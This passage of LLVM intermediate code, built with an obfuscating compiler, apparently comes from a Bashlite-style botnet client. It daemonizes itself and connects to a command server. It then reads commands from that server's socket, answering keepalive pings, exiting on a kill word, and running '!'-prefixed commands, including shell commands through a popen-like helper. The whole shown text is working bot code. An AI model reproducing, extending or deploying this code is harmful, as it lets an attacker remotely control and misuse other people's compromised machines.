  %18 = call i32 @waitpid(i32 %15, i32* nonnull %3, i32 0) #3
  call void @exit(i32 0) #16
  unreachable

; <label>:19:                                     ; preds = %2
  %20 = tail call i32 @fork() #3
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %23, label %22

; <label>:22:                                     ; preds = %19
  tail call void @exit(i32 0) #16
  unreachable

; <label>:23:                                     ; preds = %19
  %24 = tail call i32 @setsid() #3
  %25 = tail call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.66, i64 0, i64 0)) #3
  %26 = tail call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #3
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %28 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 1
  %29 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 0
  br label %.backedge83

.backedge83:                                      ; preds = %.backedge83.backedge, %23
  %30 = call i32 @initConnection()
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %.preheader82, label %35

.preheader82:                                     ; preds = %.backedge83
  %32 = load i32, i32* @mainCommSock, align 4
  %33 = call i32 @recvLine(i32 %32, i8* nonnull %27, i32 4096)
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %._crit_edge113, label %.preheader81.preheader

.preheader81.preheader:                           ; preds = %.preheader82
  br label %.preheader81

; <label>:35:                                     ; preds = %.backedge83
  %puts74 = call i32 @puts(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @str.2, i64 0, i64 0))
  %36 = call i32 @sleep(i32 5) #3
  br label %.backedge83.backedge

.backedge83.backedge:                             ; preds = %35, %._crit_edge113
  br label %.backedge83

.preheader81:                                     ; preds = %.preheader81.preheader, %.backedge
  %37 = phi i32 [ %92, %.backedge ], [ %33, %.preheader81.preheader ]
  %38 = load i64, i64* @numpids, align 8
  %39 = icmp eq i64 %38, 0
  br i1 %39, label %._crit_edge100, label %.lr.ph99.preheader

.lr.ph99.preheader:                               ; preds = %.preheader81
  br label %.lr.ph99

.lr.ph99:                                         ; preds = %.lr.ph99.preheader, %82
  %indvars.iv = phi i64 [ %indvars.iv.next, %82 ], [ 0, %.lr.ph99.preheader ]
  %40 = load i32*, i32** @pids, align 8
  %41 = getelementptr inbounds i32, i32* %40, i64 %indvars.iv
  %42 = load i32, i32* %41, align 4
  %43 = call i32 @waitpid(i32 %42, i32* null, i32 1) #3
  %44 = icmp sgt i32 %43, 0
  br i1 %44, label %.preheader, label %82

.preheader:                                       ; preds = %.lr.ph99
  %45 = add nuw i64 %indvars.iv, 1
  %46 = load i64, i64* @numpids, align 8
  %47 = icmp ult i64 %45, %46
  %48 = load i32*, i32** @pids, align 8
  %49 = trunc i64 %indvars.iv to i32
  br i1 %47, label %.lr.ph90.preheader, label %._crit_edge91

.lr.ph90.preheader:                               ; preds = %.preheader
  %50 = trunc i64 %45 to i32
  %51 = trunc i64 %indvars.iv to i32
  br label %.lr.ph90

.lr.ph90:                                         ; preds = %.lr.ph90.preheader, %.lr.ph90
  %52 = phi i32* [ %61, %.lr.ph90 ], [ %48, %.lr.ph90.preheader ]
  %53 = phi i64 [ %58, %.lr.ph90 ], [ %45, %.lr.ph90.preheader ]
  %.06989 = phi i32 [ %.069, %.lr.ph90 ], [ %50, %.lr.ph90.preheader ]
  %.069.in88 = phi i32 [ %.06989, %.lr.ph90 ], [ %51, %.lr.ph90.preheader ]
  %54 = getelementptr inbounds i32, i32* %52, i64 %53
  %55 = load i32, i32* %54, align 4
  %56 = zext i32 %.069.in88 to i64
  %57 = getelementptr inbounds i32, i32* %52, i64 %56
  store i32 %55, i32* %57, align 4
  %.069 = add i32 %.06989, 1
  %58 = zext i32 %.069 to i64
  %59 = load i64, i64* @numpids, align 8
  %60 = icmp ult i64 %58, %59
  %61 = load i32*, i32** @pids, align 8
  br i1 %60, label %.lr.ph90, label %._crit_edge91.loopexit

._crit_edge91.loopexit:                           ; preds = %.lr.ph90
  br label %._crit_edge91

._crit_edge91:                                    ; preds = %._crit_edge91.loopexit, %.preheader
  %.069.in.lcssa = phi i32 [ %49, %.preheader ], [ %.06989, %._crit_edge91.loopexit ]
  %.lcssa = phi i32* [ %48, %.preheader ], [ %61, %._crit_edge91.loopexit ]
  %62 = zext i32 %.069.in.lcssa to i64
  %63 = getelementptr inbounds i32, i32* %.lcssa, i64 %62
  store i32 0, i32* %63, align 4
  %64 = load i64, i64* @numpids, align 8
  %65 = add i64 %64, -1
  store i64 %65, i64* @numpids, align 8
  %66 = shl i64 %64, 2
  %67 = call noalias i8* @malloc(i64 %66) #3
  %68 = bitcast i8* %67 to i32*
  %69 = icmp eq i64 %65, 0
  %70 = load i32*, i32** @pids, align 8
  br i1 %69, label %._crit_edge96, label %.lr.ph95.preheader

.lr.ph95.preheader:                               ; preds = %._crit_edge91
  br label %.lr.ph95

.lr.ph95:                                         ; preds = %.lr.ph95.preheader, %.lr.ph95
  %71 = phi i32* [ %80, %.lr.ph95 ], [ %70, %.lr.ph95.preheader ]
  %72 = phi i64 [ %77, %.lr.ph95 ], [ 0, %.lr.ph95.preheader ]
  %.17093 = phi i32 [ %76, %.lr.ph95 ], [ 0, %.lr.ph95.preheader ]
  %73 = getelementptr inbounds i32, i32* %71, i64 %72
  %74 = load i32, i32* %73, align 4
  %75 = getelementptr inbounds i32, i32* %68, i64 %72
  store i32 %74, i32* %75, align 4
  %76 = add i32 %.17093, 1
  %77 = zext i32 %76 to i64
  %78 = load i64, i64* @numpids, align 8
  %79 = icmp ult i64 %77, %78
  %80 = load i32*, i32** @pids, align 8
  br i1 %79, label %.lr.ph95, label %._crit_edge96.loopexit

._crit_edge96.loopexit:                           ; preds = %.lr.ph95
  br label %._crit_edge96

._crit_edge96:                                    ; preds = %._crit_edge96.loopexit, %._crit_edge91
  %.lcssa84 = phi i32* [ %70, %._crit_edge91 ], [ %80, %._crit_edge96.loopexit ]
  %81 = bitcast i32* %.lcssa84 to i8*
  call void @free(i8* %81) #3
  store i8* %67, i8** bitcast (i32** @pids to i8**), align 8
  br label %82

; <label>:82:                                     ; preds = %.lr.ph99, %._crit_edge96
  %indvars.iv.next = add nuw i64 %indvars.iv, 1
  %sext = shl i64 %indvars.iv.next, 32
  %83 = ashr exact i64 %sext, 32
  %84 = load i64, i64* @numpids, align 8
  %85 = icmp ult i64 %83, %84
  br i1 %85, label %.lr.ph99, label %._crit_edge100.loopexit

._crit_edge100.loopexit:                          ; preds = %82
  br label %._crit_edge100

._crit_edge100:                                   ; preds = %._crit_edge100.loopexit, %.preheader81
  %86 = sext i32 %37 to i64
  %87 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %86
  store i8 0, i8* %87, align 1
  call void @trim(i8* nonnull %27)
  %strncmp = call i32 @strncmp(i8* nonnull %27, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i64 0, i64 0), i64 4)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %88, label %94

; <label>:88:                                     ; preds = %._crit_edge100
  %89 = load i32, i32* @mainCommSock, align 4
  %90 = call i32 (i32, i8*, ...) @sockprintf(i32 %89, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i64 0, i64 0))
  br label %.backedge

.backedge.loopexit:                               ; preds = %.lr.ph112
  br label %.backedge

.backedge.loopexit133:                            ; preds = %.preheader114
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit133, %.backedge.loopexit, %._crit_edge109.thread, %88, %._crit_edge109, %96, %128
  %91 = load i32, i32* @mainCommSock, align 4
  %92 = call i32 @recvLine(i32 %91, i8* nonnull %27, i32 4096)
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %._crit_edge113.loopexit, label %.preheader81

; <label>:94:                                     ; preds = %._crit_edge100
  %strncmp72 = call i32 @strncmp(i8* nonnull %27, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.69, i64 0, i64 0), i64 3)
  %cmp73 = icmp eq i32 %strncmp72, 0
  br i1 %cmp73, label %95, label %96

; <label>:95:                                     ; preds = %94
  call void @exit(i32 0) #16
  unreachable

; <label>:96:                                     ; preds = %94
  %97 = load i8, i8* %27, align 16
  %98 = icmp eq i8 %97, 33
  br i1 %98, label %.preheader114.preheader, label %.backedge

.preheader114.preheader:                          ; preds = %96
  br label %.preheader114

.preheader114:                                    ; preds = %.preheader114.preheader, %100
  %.067 = phi i8* [ %101, %100 ], [ %28, %.preheader114.preheader ]
  %99 = load i8, i8* %.067, align 1
  switch i8 %99, label %100 [
    i8 0, label %.backedge.loopexit133
    i8 32, label %102
  ]

; <label>:100:                                    ; preds = %.preheader114
  %101 = getelementptr inbounds i8, i8* %.067, i64 1
  br label %.preheader114

; <label>:102:                                    ; preds = %.preheader114
  store i8 0, i8* %.067, align 1
  %103 = call i64 @strlen(i8* %28) #14
  %104 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %103
  %105 = getelementptr inbounds i8, i8* %104, i64 2
  br label %106

; <label>:106:                                    ; preds = %111, %102
  %107 = call i64 @strlen(i8* %105) #14
  %108 = add i64 %107, -1
  %109 = getelementptr inbounds i8, i8* %105, i64 %108
  %110 = load i8, i8* %109, align 1
  switch i8 %110, label %.preheader79.preheader [
    i8 13, label %111
    i8 10, label %111
  ]

.preheader79.preheader:                           ; preds = %106
  br label %.preheader79

; <label>:111:                                    ; preds = %106, %106
  store i8 0, i8* %109, align 1
  br label %106

.preheader79:                                     ; preds = %.preheader79.preheader, %113
  %.068 = phi i8* [ %114, %113 ], [ %105, %.preheader79.preheader ]
  %112 = load i8, i8* %.068, align 1
  switch i8 %112, label %113 [
    i8 32, label %115
    i8 0, label %115
  ]

; <label>:113:                                    ; preds = %.preheader79
  %114 = getelementptr inbounds i8, i8* %.068, i64 1
  br label %.preheader79

; <label>:115:                                    ; preds = %.preheader79, %.preheader79
  store i8 0, i8* %.068, align 1
  %116 = getelementptr inbounds i8, i8* %.068, i64 1
  %117 = load i8, i8* %105, align 1
  %118 = icmp eq i8 %117, 0
  br i1 %118, label %._crit_edge104, label %.lr.ph103.preheader

.lr.ph103.preheader:                              ; preds = %115
  br label %.lr.ph103

.lr.ph103:                                        ; preds = %.lr.ph103.preheader, %.lr.ph103
  %119 = phi i8 [ %124, %.lr.ph103 ], [ %117, %.lr.ph103.preheader ]
  %.065101 = phi i8* [ %123, %.lr.ph103 ], [ %105, %.lr.ph103.preheader ]
  %120 = zext i8 %119 to i32
  %121 = call i32 @toupper(i32 %120) #14
  %122 = trunc i32 %121 to i8
  store i8 %122, i8* %.065101, align 1
  %123 = getelementptr inbounds i8, i8* %.065101, i64 1
  %124 = load i8, i8* %123, align 1
  %125 = icmp eq i8 %124, 0
  br i1 %125, label %._crit_edge104.loopexit, label %.lr.ph103

._crit_edge104.loopexit:                          ; preds = %.lr.ph103
  br label %._crit_edge104

._crit_edge104:                                   ; preds = %._crit_edge104.loopexit, %115
  %126 = call i32 @strcmp(i8* %105, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.70, i64 0, i64 0)) #14
  %127 = icmp eq i32 %126, 0
  br i1 %127, label %128, label %141

; <label>:128:                                    ; preds = %._crit_edge104
  %129 = call i32 @listFork()
  %130 = icmp eq i32 %129, 0
  br i1 %130, label %131, label %.backedge

; <label>:131:                                    ; preds = %128
  %132 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %132, i8 0, i64 1024, i32 16, i1 false)
  %133 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %132, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.71, i64 0, i64 0), i8* %116)
  %134 = call i32 @fdpopen(i8* nonnull %132, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.72, i64 0, i64 0))
  %135 = call i8* @fdgets(i8* nonnull %132, i32 1024, i32 %134)
  %136 = icmp eq i8* %135, null
  br i1 %136, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %131
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  call void @trim(i8* nonnull %132)
  call void @llvm.memset.p0i8.i64(i8* nonnull %132, i8 0, i64 1024, i32 16, i1 false)
  %137 = call i32 @sleep(i32 1) #3
  %138 = call i8* @fdgets(i8* nonnull %132, i32 1024, i32 %134)
  %139 = icmp eq i8* %138, null
  br i1 %139, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %131
  %140 = call i32 @fdpclose(i32 %134)
  call void @exit(i32 0) #16
  unreachable

; <label>:141:                                    ; preds = %._crit_edge104
  %142 = call i8* @strtok(i8* %116, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.73, i64 0, i64 0)) #3
  store i8* %105, i8** %29, align 16
  %143 = icmp eq i8* %142, null
  br i1 %143, label %._crit_edge109.thread, label %.lr.ph108.preheader

.lr.ph108.preheader:                              ; preds = %141
  br label %.lr.ph108

._crit_edge109.thread:                            ; preds = %141
  call void @processCmd(i32 1, i8** nonnull %29)
  br label %.backedge

.lr.ph108:                                        ; preds = %.lr.ph108.preheader, %156
  %.063106 = phi i8* [ %157, %156 ], [ %142, %.lr.ph108.preheader ]
  %.064105 = phi i32 [ %.1, %156 ], [ 1, %.lr.ph108.preheader ]
  %144 = load i8, i8* %.063106, align 1
  %145 = icmp eq i8 %144, 10
  br i1 %145, label %156, label %146

; <label>:146:                                    ; preds = %.lr.ph108
  %147 = call i64 @strlen(i8* nonnull %.063106) #14
  %148 = add i64 %147, 1
  %149 = call noalias i8* @malloc(i64 %148) #3
  %150 = sext i32 %.064105 to i64
  %151 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 %150
  store i8* %149, i8** %151, align 8
  %152 = call i64 @strlen(i8* nonnull %.063106) #14
  %153 = add i64 %152, 1
  call void @llvm.memset.p0i8.i64(i8* %149, i8 0, i64 %153, i32 1, i1 false)
  %154 = call i8* @strcpy(i8* %149, i8* nonnull %.063106) #3
  %155 = add nsw i32 %.064105, 1
  br label %156

; <label>:156:                                    ; preds = %.lr.ph108, %146
  %.1 = phi i32 [ %155, %146 ], [ %.064105, %.lr.ph108 ]
  %157 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.73, i64 0, i64 0)) #3
  %158 = icmp eq i8* %157, null
  br i1 %158, label %._crit_edge109, label %.lr.ph108

._crit_edge109:                                   ; preds = %156
  call void @processCmd(i32 %.1, i8** nonnull %29)
  %159 = icmp sgt i32 %.1, 1
  br i1 %159, label %.lr.ph112.preheader, label %.backedge

.lr.ph112.preheader:                              ; preds = %._crit_edge109
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph112

.lr.ph112:                                        ; preds = %.lr.ph112.preheader, %.lr.ph112
  %indvars.iv121 = phi i64 [ %indvars.iv.next122, %.lr.ph112 ], [ 1, %.lr.ph112.preheader ]
  %160 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 %indvars.iv121
  %161 = load i8*, i8** %160, align 8
  call void @free(i8* %161) #3
  %indvars.iv.next122 = add nuw nsw i64 %indvars.iv121, 1
  %exitcond = icmp eq i64 %indvars.iv.next122, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph112

._crit_edge113.loopexit:                          ; preds = %.backedge
  br label %._crit_edge113

._crit_edge113:                                   ; preds = %._crit_edge113.loopexit, %.preheader82
  %puts = call i32 @puts(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @str.1, i64 0, i64 0))
  br label %.backedge83.backedge
}

declare i32 @prctl(...) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @setsid() local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #5

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #5

declare i32 @sleep(i32) local_unnamed_addr #4

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) #14

; Function Attrs: nounwind
declare i32 @puts(i8* nocapture readonly) #3

attributes #0 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { nounwind readonly }
attributes #15 = { nounwind returns_twice }
attributes #16 = { noreturn nounwind }
attributes #17 = { nounwind readnone }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146612883}
!2 = !{i32 -2146611443}
!3 = !{i32 -2146610620}
!4 = distinct !{!4, !5}
!5 = !{!"llvm.loop.unroll.disable"}
!6 = !{i32 -2146609800}
!7 = !{i32 -2146608456}
!8 = !{i32 -2146607594}
!9 = !{i32 -2146606873}
